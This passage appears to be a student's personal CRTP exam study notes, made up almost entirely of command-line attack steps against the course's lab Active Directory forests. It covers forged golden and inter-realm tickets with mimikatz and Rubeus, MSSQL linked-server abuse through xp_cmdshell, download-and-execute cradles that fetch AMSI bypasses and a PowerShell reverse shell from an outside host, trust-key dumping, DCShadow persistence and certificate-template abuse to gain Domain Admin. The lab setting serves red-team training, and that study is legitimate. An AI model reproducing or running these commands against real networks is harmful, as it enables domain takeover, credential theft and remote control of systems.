    # An inter-forest TGT can be forged
    Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid: /rc4:af0686cc0ca8f04df42210c9ac980760 /service:krbtgt /target:MONEYCORP.LOCAL /ticket:C:\trust_forest_tkt.kirbi"'
    # Request TGS to the a service in the furest domain
    asktgs.exe C:\trust_forest_tht.kirbi CIFS/forest domain name
    # Inject the TGS 
    kirbikator.exe lsa .\<path and TGS file name>
    # check if avilable 
    klist
    ```
    
- Trust Abuse - MSSQL Server
    
    ```powershell
    # For MSSQL and PowerShell hackery, use PowerUpSQL
    https://github.com/NetSPI/PowerUpSQL 
    # start with enumerating SQL servers in the domain and if studentx has privileges to connect to any
    # of them
    Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
    Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
    
    # Check Accessibility
    Get-SQLConnectionTestThereaded 
    
    Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
    # Gather Information
    Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
    # Searching Database Links
    # Look for links to remote servers
    Get-SQLServerLink -Instance dcorp-mssql -Verbose
    # check the "databaselinklocation"
    # Enumerating Database Links
    Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose 
    
    # If xp_cmdshell is enabled
    Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"
    
    # Let’s try to execute a PowerShell download execute cradle to execute a PowerShell reverse shell on the
    # eu-sql instance. Remember to start a listener:
    Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.111/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.111/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.111/InvokePowerShellTcpEx.ps1)"''' -QueryTarget eu-sql
    # On the listener:
    C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
    
    ```
    
    ### **Executing Commands**
    
    ```powershell
    # On the target mssql server, enable xp_cmdshell
    EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "EU-SQL.EU.EUROCORP.LOCAL"
    
    # after enable use the PowerUpSQL script the execute command
    Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" | ft
    
    # load reverse tcp shell on sql server
    Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(''http://172.16.100.111/InvokePowerShellTcpEx.ps1'')"'
    
    # HeidiSQL client
    # enumerate linked databases on dcorp-mssql:
    select * from master..sysservers
    # enumerate further links from dcorpsql1
    select * from openquery("DCORP-SQL1",'select * from master..sysservers')
    # another openquery which leads us to dcorp-mgmt:
    select * from openquery("DCORP-SQL1",'select * from openquery("DCORPMGMT",''select * from master..sysservers'')')
    
    ```
    
- SID Injection Attack
    
    ```powershell
    .\mimikatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
    ```
    
- DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest
    
    ```powershell
    # We need the trust key for the trust between dollarcorp and eurocrop
    # Start a process with DA privileges. Run the below command from an elevated command prompt:
    C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin
    /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
    /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
    # Using SafetyKatz.exe
    # Run the below commands from the process running as DA to copy Loader.exe on dcorp-dc and use it to
    # extract credentials
    echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
    # remote shell on the DC
    winrs -r:dcorp-dc cmd
    # port forwareding from the remote shell
    netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.111
    # make shure you have web server on port 80 , with SafetyHatz.exe
    # run the command from the remote shell in order to run the exe file in the memory
    C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
    mimikatz # lsadump::trust /patch
    # copy the rc4_hmac_nt between DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL
    # Forge an inter-realm TGT. Run the below command from an elevated command prompt:
    C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden
    /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-
    719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-
    3279953914-519 /rc4:163373571e6c3e09673010fd60accdf0 /service:krbtgt
    /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"
    # Use the ticket with Rubeus:
    C:\AD\Tools\Rubeus.exe asktgs
    /ticket:C:\AD\Tools\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
    # Check if we can access explicitly shared resources eurocorp-dc!
    dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
    ```
    
- Forest Persistence -DCShadow
    
    ```powershell
    # Open two mimikatz instaces :
    # One to start RPC server with SYSTEM privileges and specify attributes to be modified:
    !+
    !processtoken
    lsadump::dcshadow /object: /attribute: /value: 
    
    # Second with enough privileges (DA or otherwise) to push the values.
    lsadump::dcshadow /push
    ```
    
    - DCShadow - Minimal Permissions
        
        ```powershell
        # use Set-DCShadowPermissions.ps1 from Nishang for setting the permissions.
        
        # For example, to use DCShadow as user student1 to modify root1user object from machine mcorp-student1:
        Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose
        ```
        
- AD CS Attack
    
    [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin)
    
    ```powershell
    # check for AD CS in moneycorp
    C:\AD\Tools\Certify.exe cas
    # list all the templates
    certify.exe find
    # get some more information about it as it allows
    # requestor to supply subject name:
    C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
    # request a certificate for Domain Admin - Administrator:
    C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
    # Copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END
    # CERTIFICATE----- and save it to esc1.pem.
    # We need to convert it to PFX to use it. Use openssl binary on the student VM to do that. I will use
    # SecretPass@123 as the export password.
    C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
    # Use the PFX created above with Rubeus to request a TGT for DA - Administrator!
    C:\AD\Tools\Rubeus.exe asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt
    ```
    
    ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%2012.png)
    
    ```powershell
    certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:HTTPSCertificates /altname:Administrator
    
    ```
    
    ![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%2013.png)
    
    ```powershell
    # copy the RSA Private Key and the CERTIFICATE into a file and rename it to cert.pem 
    # Use openssl to create cert.pfx (in Linux):
    openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
    # Use openssl to create cert.pfx (Windows):
    C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
    # Requesting TGT with Certificate
    .\Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:cert.pfx /ptt
    ```
    

![Untitled](CRTP%206756888251ee43148a0a99964ffc3748/Untitled%2014.png)

[exam](https://www.notion.so/exam-7d1069b76eb04a3989c9dc1173428867)
